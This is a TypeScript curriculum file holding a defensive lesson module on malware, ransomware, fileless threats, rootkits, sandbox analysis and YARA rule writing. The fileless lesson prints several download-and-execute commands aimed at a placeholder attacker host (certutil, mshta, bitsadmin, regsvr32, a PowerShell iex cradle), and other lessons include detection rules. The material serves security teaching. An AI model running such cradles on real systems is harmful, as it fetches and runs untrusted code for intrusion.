import type { Module } from "../curriculum";

export const module29: Module = {
  id: "module-29",
  slug: "29-malware-fileless",
  title: "Malware, Fileless Threats & Rootkits",
  description:
    "Viruses, worms, trojans, ransomware, APT tooling, fileless memory-only threats, rootkits & bootkits — and the sandbox/YARA analysis that defeats them.",
  language: "Malware",
  lessons: [
    {
      id: 1,
      slug: "01-malware-basics",
      title: "Malware Taxonomy",
      level: "intermediate",
      tag: "concept",
      duration: "40 min",
      description:
        "Virus, worm, trojan, ransomware, spyware, bot — what they do, how they spread, and what they need to survive.",
      content: `
# Malware Taxonomy

## The family tree

| Type | Definition | Spread / role |
|------|------------|---------------|
| **Virus** | Replicates by attaching to files/programs | Requires a host file and human action |
| **Worm** | Self-propagating standalone program | Exploits network + autospreads (Code Red, Morris) |
| **Trojan** | Disguised as legitimate; isn't | Backdoors, RATs, fake updaters |
| **Ransomware** | Encrypts/locks data for payment | Often worm-ish or phishing-delivered |
| **Spyware** | Steals info/behavior data | Bundled installs, keyloggers |
| **Bot** | Joins a C2 botnet | DDoS, spam, proxying, credential harvesting |
| **RAT** | Remote Access Tool (abused) | Full remote control, screenshots, keylog |
| **Adware/PUP** | Unwanted but 'gray' | Revenue, system hooks |

## The lifecycle of an infection

1. **Delivery** (phishing, drive-by, malicious USB, supply chain)
2. **Execution** (user double-click, exploit, macro, service)
3. **Persistence** — survive reboot (run keys, services)
4. **Defense evasion** — obfuscate, pack, polymorph
5. **C2** — beacon home
6. **Actions** — exfil, ransom, destroy

## Malware needs

- **Armoring**: packers (UPX), cryptors, obfuscators, polymorphism — so AV signatures miss
- **Persistence + evasion**: living off the land (PowerShell/mshta/cscript) to blend in
- **Kill-chains** in time: stay quiet (dwell time), beacon low-and-slow

## Modern realism

- Most malware today is **loaders + C2**: the first-stage is small; the final payload downloads later
- Ransomware *operates* (EDR on) — defensive success = stop chain early
- APTs weaponize **dual-use** tools (PowerShell, certutil, BITS) so organic behavior fits

## What an analyst watches

\`\`\`
Event sources: process creation, network connections, registry writes,
file writes, scheduled tasks, WMI, services, autoruns, child processes.
\`\`\`
The team that knows malware generics (symptom, spread, survival) already sees the attack half-clear before the sandbox report lands.
`,
      defaultCode: `// Classify a sample by its observable behaviors
const sample = {
  files: ['temp\\svc.exe', 'Documents\\invoice.pdf'],
  network: ['POST beacon.example.dev:443'],
  persistence: ['HKCU Run', 'scheduled task']
};
console.log('Delivery:', /invoice|\.pdf/.test(sample.files[1]) ? 'lure' : '?');
console.log('Persistence:', sample.persistence.join(', '));`,
      solution: `const sample = {
  files: ['temp\\svc.exe', 'Documents\\invoice.pdf'],
  network: ['POST beacon.example.dev:443'],
  persistence: ['HKCU Run', 'scheduled task']
};
console.log('Delivery:', /invoice|\.pdf/.test(sample.files[1]) ? 'lure' : '?');
console.log('Persistence:', sample.persistence.join(', '));`,
      hint: "Classify by behavior vectors: delivery, execution, persist, evade, C2.",
      challenge: `**Home Lab — Malware Taxonomy Notes:**
1. Pick 5 real malware families from public reporting (e.g., Emotet, LockBit, WannaCry, Mirai, Cobalt Strike-as-malware).
2. For each, note type, delivery, persistence, C2, payload.
3. Compare: how does ransomware differ from an APT backdoor in these 5 fields?
4. Write a 'one-paragraph-virus-profile' template you can fill for any sample.
5. Bookmark VirusTotal and MalwareBazaar for later analysis labs.`,
    },
    {
      id: 2,
      slug: "02-ransomware-deep",
      title: "Ransomware: Operators, Tactics, Defenses",
      level: "intermediate",
      tag: "concept",
      duration: "45 min",
      description:
        "From CryptoLocker to double extortion: how ransomware runs as a business, the TTPs, and the defense spine that survives it.",
      content: `
# Ransomware: Operators, Tactics, Defenses

## The modern ransomware business

- **RaaS (Ransomware-as-a-Service)**: developers (affiliates) lease ransomware; operators do access; negotiators/exfil teams split proceeds (e.g., LockBit, BlackCat, Conti-hold)
- **Double extortion**: encrypt AND threaten to leak / already exfiltrate data
- **Triple leverage**: add DDoS on top, or pressure customers/regulators
- **Initial access economy**: purchased footholds (Broker/access sellers), VPNs without MFA, exposed RDP

## Typical TTP sequence

1. **Initial access**: phishing lure, vuln VPN, RDP brute
2. **Foothold + C2**: beacon; side moves
3. **Privilege elevation**: Kerberoast/domain account (often within hours)
4. **Lateral + destroy backups**: net use/psexec/windows task spread; kill/delete backup volumes (VSS, tapes, cloud snapshots!)
5. **Exfil** staging (double extortion) — often via FTP/cloud to attacker
6. **Detonation**: encrypt all, drop ransom note
7. **Negotiation + leak site** (public shame shaming)

## Defense spine (assume breach)

- **Backups immutable & offline**: 3-2-1 (3 copies, 2 media, 1 offsite), tested restore quarterly; cloud snapshots versioned + protected from deletion
- **MFA everywhere**: stops the #1 access vector (VPN/RDP)
- **Segment + least privilege**: stops lateral speed; tier-0 admin secured
- **EDR + detection**: respond to beaconing BEFORE encryption
- **IR runbook + tabletop**: rehearse restore; decision-makers know 'pay or not' policy
- **User training**: recognize the lure

## If infected

1. Contain: disconnect target(s) at switch level
2. Preserve evidence (forensic images)
3. Engage IR + law enforcement/mitigation; check ransomware response groups
4. Decide/ext to restore from clean immutable backups

> Ransomware wins on speed of movement vs speed of detection. Every hour of dwell time you deny the attacker is an hour your restorers win.
`,
      defaultCode: `// Model the ransom kill-chain phases to plan defenses
const phases = [
  'initial-access','foothold','privesc',
  'lateral','destroy-backups','exfil','encrypt'
];
const defenses = {
  'initial-access': 'MFA on VPN/RDP',
  'destroy-backups': 'immutable offline backups',
  'lateral': 'segmentation + least privilege',
  'encrypt': 'EDR + fast response'
};
for (const p of phases) {
  console.log(p, '->', defenses[p] || 'monitor');
}`,
      solution: `const phases = [
  'initial-access','foothold','privesc',
  'lateral','destroy-backups','exfil','encrypt'
];
const defenses = {
  'initial-access': 'MFA on VPN/RDP',
  'destroy-backups': 'immutable offline backups',
  'lateral': 'segmentation + least privilege',
  'encrypt': 'EDR + fast response'
};
for (const p of phases) {
  console.log(p, '->', defenses[p] || 'monitor');
}`,
      hint: "Backup immutability + MFA + EDR = the triple that survives ransomware.",
      challenge: `**Home Lab — Ransomware Runbook:**
1. Write a 1-page personal ransomware runbook (you + your data): detect, contain, preserve, restore.
2. Verify your backup plan: offsite copy? versioned? can you actually restore within 24h?
3. Audit: which of your internet-facing accounts lack MFA — fix the top 3 today.
4. Draft the 'do we pay?' decision criteria for your business context (or for a hypothetical).
5. Identify your single biggest ransomware risk and the cheapest mitigation.`,
    },
    {
      id: 3,
      slug: "03-fileless-living-off-land",
      title: "Fileless & 'Living Off the Land' Threats",
      level: "advanced",
      tag: "lab",
      duration: "50 min",
      description:
        "PowerShell, macros, WMI, mshta, LOLBAS — attacks that never write a malware file, and the process-level hunting that finds them.",
      content: `
# Fileless & 'Living Off the Land' Threats

## What 'fileless' means

The malicious content lives in **memory**, the registry, or benign system tools. No signature-bearing .exe on disk — classic AV signature scanning is largely blind.

## LOLBAS: Living Off The Land Binaries and Scripts

System tools abused for offense (see lolbas-project.github.io): PowerShell, certutil, mshta, regsvr32, WMIC, BITSAdmin, MSBuild, rundll32, wscript, cscript.

\`\`\`
# classic examples (LAB ONLY)
certutil -urlcache -split -f http://attacker/payload.exe C:\\p.exe
mshta http://attacker/payload.hta
powershell -enc <base64-command>        # encoded
bitsadmin /transfer u /download http://attacker/x.exe C:\\x.exe
regsvr32 /s /u /i:http://attacker/x.sct scrobj.dll
\`\`\`

## PowerShell — the star offender

- Download cradle: \`iex (New-Object Net.WebClient).DownloadString('http://x/p.ps1')\`
- In-memory module: \`Invoke-Mimikatz\`
- Obfuscation: base64, string splicing, environment-variable assembly, EncodedCommand
- **Defense**: Constrained Language Mode + PS script block logging + AMSI

## The macros-and-hooks hotel

- Office macros (macro-level malware, PowerPoint, Excel 4.0)
- WMI event subscriptions fire processes
- Registry AppInit_DLLs loads a DLL into every process

## Hunting fileless (blue)

- **Process genealogy**: Was this process spawned by Office? (parent-child anomalies)
- **Unusual script engine children**: powershell/cmd from Word/Excel/Outlook = red flag
- **Network + process**: powershell.exe with an outbound connection
- **Sysmon**: EventID 1 (process), 3 (network), 13 (registry); script block logging (4104)
- **AMSI** (Antimalware Scan Interface): shows scripts to AV even in memory (bypassable — treat as helper, not god)

## The duality

Same tools = offense AND legitimate admin. The differentiator is *context*: who invoked it, from where, toward what, and what network it hoisted. Threat hunting = context hunting.
`,
      defaultCode: `# (LAB ONLY, on a disposable VM)
# baseline your own environment: what scripts fire today?
Get-CimInstance Win32_Process | Select-Object ProcessId, ParentProcessId, Name |
  Where-Object { $_.Name -match 'powershell|cmd|mshta|cscript|wscript' } |
  Format-Table -AutoSize`,
      solution: `Get-CimInstance Win32_Process | Select-Object ProcessId, ParentProcessId, Name |
  Where-Object { $_.Name -match 'powershell|cmd|mshta|cscript|wscript' } |
  Format-Table -AutoSize`,
      hint: "Hunt by child-process and network context, not by filename.",
      challenge: `**Home Lab — The Cradle (with discipline):**
1. On a DISPOSABLE VM, run a harmless 'download cradle' script that hits a file on your Kali (not a real site).
2. Enable PowerShell script-block logging (Group Policy) and AMSI — then RE-RUN and see what's captured (4104 events).
3. In Sysmon/SIEM terms, design ONE detection for 'office spawning powershell'.
4. Write: which of your detection ideas would produce false positives, and how would you tame them?
5. Clean up: delete downloaded file, revert VM.`,
    },
    {
      id: 4,
      slug: "04-rootkits-bootkits",
      title: "Rootkits & Bootkits",
      level: "advanced",
      tag: "concept",
      duration: "40 min",
      description:
        "Using kernel-mode to hide: SSDT/GDT hooks, DKOM, Minifilters, rootkit persistence — and the memory/trusted-boot defenses that see them.",
      content: `
# Rootkits & Bootkits

## Terminology

- **Rootkit**: software that maintains privileged access by **hiding** itself and its artifacts (files, processes, network) from system tools
- **Bootkit**: a rootkit that persists before the OS loads (in firmware/boot chain)
- **Kernel rootkit**: loads into kernel — has God-like visibility

## Rootkit hiding techniques

| Technique | What it does |
|-----------|--------------|
| **DKOM** (Direct Kernel Object Manipulation) | Unlinks a process object from the active list — 'ps' can't see it |
| **SSDT / system-call hooks** | Redirect system calls; hide files/keys/processes from callers |
| **Filter drivers (minifilters)** | Intercept file/directory requests; a file 'never existed' |
| **Inline hooks** | Patch kernel functions directly (most advanced) |
| **Bootkit MBR/VBR hooking** | Redirect boot sector flow (old), UEFI memory corruption (modern) |

## Symptoms (subtle)

- File hashes mismatch (system files patched)
- 'Blue screens' after hooking
- Anti-rootkit tools see anomalies (but the rootkit hides from them too)
- EDR agents that detect hooking/changes uncommonly

## Detection arsenal

- **Memory forensics**: Volatility's \`!ssdt\`, \`!modules\`, \`!driverscan\` compare live vs image
- **Kernel integrity**: patchguard (Windows) detects kernel hooks → system bugchecks (so rootkits avoid it, or live in kernel memory outside PatchGuard's scope)
- **Secure Boot + trusted boot** (hardware): verify chain; doesn't read kernel fluff but boots clean
- **Live kernel memory diffs**: contrast a known-clean baseline with the suspicious system

## Bootkit modern reality

- Uses boot manager/EFI deceptions (BootHole, BlackLotus)
- Secure Boot bypasses being sought — that's why Microsoft now signs/attests boot components
- Bootkits must evade UEFI Secure Boot; a UEFI-rooted attack is the deepest

## The honest expert line

Memory-rootkit sightings are rare in the wild (huge cost, high risk of blue-screen detection) — but the demonstration lab teaches you the mechanism, which is the same mechanism EDR and anti-cheat engineers fight.

> Learn the class, not just the celebrity. If you can articulate 'how would malware hide from ps aux' you already know half of endpoint defense.
`,
      defaultCode: `// Seeing the invisible mathematically: compare lists
const kernelObjects = ['pslist:1000', 'net:80', 'file:7'];
const apiViews = globalThis.kernelObjects || ['net:80', 'file:7'];

function difference(a, b) {
  return a.filter(x => !b.includes(x));
}
console.log('Hidden by demo:', difference(kernelObjects, apiViews));
// The kernel object that's said NON-admin tools miss = your lead.`,
      solution: `const kernelObjects = ['pslist:1000', 'net:80', 'file:7'];
const apiViews = globalThis.kernelObjects || ['net:80', 'file:7'];
function difference(a, b) {
  return a.filter(x => !b.includes(x));
}
console.log('Hidden by demo:', difference(kernelObjects, apiViews));`,
      hint: "Rootkits create list inconsistencies — memory forensics finds the difference.",
      challenge: `**Home Lab — The Visibility Gap:**
1. Take 2 Snapshots of a Windows VM (before/after installing a demo rootkit like zeroaccess-legacy LAB or any sandboxed test kit — be careful, only in snapshot-backed VM).
2. Compare: \`tasklist\` too versus Sysinternals \`Process Explorer\` or \`Autoruns\`.
3. Try Volatility on a memory dump of the infected VM to spot DKOM.
4. Write 'how would I detect it' for each hiding method.
5. Defend: why does Secure Boot + PatchGuard make modern rootkit survival hard?`,
    },
    {
      id: 5,
      slug: "05-sandbox-malware-analysis",
      title: "Sandboxing & Malware Analysis Workflow",
      level: "advanced",
      tag: "lab",
      duration: "50 min",
      description:
        "Cuckoo-sandbox, dynamic triage, syscall tracing, MITRE-coded behavior, and the network-detection payoff of good analysis.",
      content: `
# Sandboxing & Malware Analysis Workflow

## The analysis pyramid

1. **Triage** (fast): hashes (VirusTotal), strings, YARA, pefile info
2. **Static** (no execution): Ghidra/IDA, objdump, unpacking, config extraction
3. **Dynamic** (execution, sandboxed): Cuckoo/ANY_RUN, syscall trace, network capture, process monitoring
4. **Full RE** (deep): reverse the loader, decode C2, extract IOCs

## Sandbox basics

- **REMnux** distro: analysis VM stack (REMnux + report)
- **Cuckoo Sandbox**: automated VM guest reports (files, network, behavior) — offline, config-heavy but free
- **CAPE**: Cuckoo-derived with unpacking features
- **ANY_RUN / Joe / hybrid** (cloud, careful with privacy)
- Always run a fingerprint-avoiding guest (detect slowdown, VM strings → malware goes dormant)

## A realistic dynamic session

\`\`\`
# REMnux host:
cuckoo submit sample.exe        # or CAPE
# watch: created files, registry writes, network to unknown domains,
#        child processes (powershell from calc?), screenshots

# independent route: a Windows VM with:
#   - Procmon (process/file/reg trace)
#   - Process Hacker (tree+ips)
#   - FakeNet-NG (fake net capture)
#   - snapshot before, revert after
\`\`\`

## Network IOCs to hunt

- Beaconing pattern (periodic POSTs)
- DNS fast-flux / DGA subdomains
- Unusual TLS JA3 / JA3S fingerprints
- C2 domains from your sandboxed import: URLhaus, Abuse.ch

## What 'analysis complete' looks like

A clean report: file hash(es), behavior timeline, configuration (C2 IPs, ports, mutex), MITRE technique mapping, and recommended detections (rules + EDR/network). Threat intel consumes it.

> Malware analysis converts 'we saw a weird file' into 'we will see it 40 ways next time'. Its product is the detection rule, not just the story.
`,
      defaultCode: `# The triage one-liner (REMnux or Kali)
sha256sum sample.bin
file sample.bin
strings -n 6 sample.bin | head -60
# VirusTotal lookup by hash: https://www.virustotal.com/gui/search/<hash>
yara myrules.yar .  `,
      solution: `sha256sum sample.bin
file sample.bin
strings -n 6 sample.bin | head -60
yara myrules.yar .`,
      hint: "Triage = hash, file, strings, YARA. Then sandbox executes safely.",
      challenge: `**Home Lab — Run Cuckoo/CAPE Once:**
1. Install REMnux or use Kali + a Linux guest for Cuckoo (follow the official doc).
2. Feed it a benign-but-interesting sample (a portable you compiled, or a known test file).
3. Read the report: what processes, files, network did it observe?
4. Add one-matchable IOC to a YARA rule; test it.
5. Write a 'report template' with the fields your own next analysis will fill.`,
    },
    {
      id: 6,
      slug: "06-yara-detection-rules",
      title: "YARA: Writing Detection Rules",
      level: "intermediate",
      tag: "lab",
      duration: "45 min",
      description:
        "The signature language of threat intel and EDR: strings, hex bytes, conditions, and the craft of rules that don't drown in false positives.",
      content: `
# YARA: Writing Detection Rules

## Why YARA

YARA is a pattern-matching language for files and memory. Malware hunters, EDR vendors, and threat intel teams all use it. A rule = what to look for + when to fire.

## Anatomy of a rule

\`\`\`
rule Suspicious_PowerShell_Cradle
{
  meta:
    author = "zero-day-student"
    description = "detects common download-cradle strings"
    score = 40
  strings:
    $s1 = "DownloadString" ascii nocase
    $s2 = "IEX(" ascii nocase
    $s3 = "WebClient" ascii nocase
    $s4 = { 81 EC 00 00 00 00 }  // potential decode opcode
  condition:
    uint16(0) == 0x5a4d and        // MZ header
    ( filesize < 500KB and 2 of them )
}
\`\`\`

## The string toolbox

- **ascii / wide / nocase / fullword** modifiers
- Hex patterns \`{ 6A 00 6A 00 }\`
- Regex via \`/reg exp/\`
- Multiple conditions: \`all of them\`, \`2 of ($a*) \`, \`@s1[1]\`

## Anti-FP craft

- Require a 'family marker' + a 'behavior marker' together
- Scope by size (e.g., only under 1MB)
- Reference stable metadata (MZ header, section names, unique mutex) rather than single common string
- Test against a corpus of clean files before shipping

## Where rules live

- Local: YARA CLI on your triage
- Feeds: **yara-rules** projects (YARA-Hunter, Neolex), vendor packs
- EDR: most modern EDRs accept Sigmas for detections and YARA for static/memory matches

## A professional loop

\`\`\`
1. Analyze sample -> pick 2 distinctive static markers
2. Write rule -> test on sample (must fire) and clean corpus (must not)
3. Ship it to your repo; iterate on real-world feedback
\`\`\`

> A YARA rule is a hypothesis about what a family MUST contain. When it false-positives, the hypothesis was weak (bad marker), not the tool.
`,
      defaultCode: `# A starter rule skeleton you strengthen with markers
rule Ransom_Generic_Mark
{
  meta:
    author = "student"
  strings:
    $mutex = "Global\\\\MalwareSrv"
    $note  = "RECOVER_FILES.txt"
    $ext   = /\\\\.locked$/
  condition:
    ($mutex and $note) or $ext
}
# then: yara rule.yar samples_dir`,
      solution: `rule Ransom_Generic_Mark
{
  meta:
    author = "student"
  strings:
    $mutex = "Global\\\\MalwareSrv"
    $note  = "RECOVER_FILES.txt"
    $ext   = /\\\\.locked$/
  condition:
    ($mutex and $note) or $ext
}
yara rule.yar samples_dir`,
      hint: "Pair a family marker with a behavior marker; test against clean files.",
      challenge: `**Home Lab — Rule Writer:**
1. Grab a sample you generated (or a well-known one from MalwareBazaar).
2. Use strings to find 2 distinctive markers (unique string, mutex, registry path).
3. Write a rule that fires on it.
4. Test against a folder of clean binaries (system32 copies or /usr/bin) — tune until zero FPs.
5. Write 3 sentences: which rule decisions reduced false positives most?`,
    },
  ],
};